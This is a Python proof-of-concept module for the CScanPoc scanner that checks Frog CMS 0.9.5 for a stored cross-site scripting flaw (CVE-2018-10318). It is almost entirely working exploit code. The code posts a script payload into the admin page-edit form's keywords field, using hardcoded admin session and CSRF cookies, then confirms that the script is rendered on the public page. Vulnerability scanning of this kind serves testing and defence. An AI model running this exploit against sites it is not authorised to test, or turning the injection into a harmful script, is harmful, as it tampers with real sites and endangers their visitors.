# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FrogCMS_0003_L'  # 平台漏洞编号，留空
    name = 'Frog CMS跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-04-24'  # 漏洞公布时间
    desc = '''
        Frog CMS是软件开发者Philippe Archambault所研发的一套内容管理系统（CMS）。该系统提供页面模板、用户权限管理以及文件管理所需的工具。

        Frog CMS 0.9.5版本中存在跨站脚本漏洞。远程攻击者可借助admin/?/page/edit页面中的‘keywords’参数利用该漏洞执行JavaScript代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08556'  # 漏洞来源
    cnvd_id = 'CNVD-2018-08556'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10318 '  # cve编号
    product = 'FrogCMS'  # 漏洞应用名称
    product_version = '0.9.5版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '91705440-27a8-460f-827d-20111d03e645'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/FrogCMS-master/admin/?/page/edit/3'
            # 首先注册用户。
            # 获取cookies
            cookies = {}
            raw_cookies = 'current_tab=:tab-1; UM_distinctid=162db899f8a468-018514197574c8-17347a40-100200-162db899f8c3bc; CNZZDATA1707573=cnzz_eid%3D271628251-1524101653-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1524101653; Hm_lvt_7b43330a4da4a6f4353e553988ee8a62=1524187137; rlF_lastvisit=1726%091524191267%09%2Ftest%2Fphpwind_v9.0.2_utf8%2Fphpwind_v9.0.2_utf8_20170401%2Findex.php%3Fm%3Ddesign%26c%3Dapi%26token%3Dt8QiA81ydN%26id%3D7%26format%3D; PHPSESSID=k4mlmjoo06qvrnks6hbsut3795; yzmphp_adminid=02fcWP1tbVyO3qjAa1o4Oj7ByNDb2DbcZpROpdWw; yzmphp_adminname=f744FywtmY54ZekJU2rO-dU8YZXZce7dHJjsdStEKAEwM5M; Hm_lpvt_7b43330a4da4a6f4353e553988ee8a62=1524187137; rlF_visitor=Dn3slOh4nWLgDBhDSMUhGlC3PsR%2FyarbBZim4JqNJp2SKE9mCXr3gw%3D%3D; csrf_token=5ac0a94ca5abfea6; frog_auth_user=exp%3D1525680458%26id%3D1%26digest%3D5a4183bf1c5de0fa91a7f31422e9a38e'
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value
            #print (cookies)
            data = 'page%5Bparent_id%5D=1&page%5Btitle%5D=aaa&page%5Bslug%5D=about_us&page%5Bbreadcrumb%5D=aa&page%5Bkeywords%5D="/><script>confirm(1234)</script>&page%5Bdescription%5D=aa&page_tag%5Btags%5D=&page%5Bcreated_on%5D=2018-04-23&page%5Bcreated_on_time%5D=08%3A07%3A26&page%5Bpublished_on%5D=2018-04-23&page%5Bpublished_on_time%5D=08%3A07%3A27&part%5B0%5D%5Bname%5D=body&part%5B0%5D%5Bid%5D=3&part%5B0%5D%5Bfilter_id%5D=textile&part%5B0%5D%5Bcontent%5D=This+is+my+site.+I+live+in+this+city+...+I+do+some+nice+things%2C+like+this+and+%22Link+Text%22%3A&page%5Blayout_id%5D=&page%5Bbehavior_id%5D=&page%5Bstatus_id%5D=100&page%5Bneeds_login%5D=2&commit=Save+and+Close'
            url = self.target + payload
            requests.post(url, cookies=cookies, data=data)

            verify_url = self.target + '/FrogCMS-master/?about_us'
            r = requests.get(verify_url)

            if "<script>confirm(1234)</script>" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
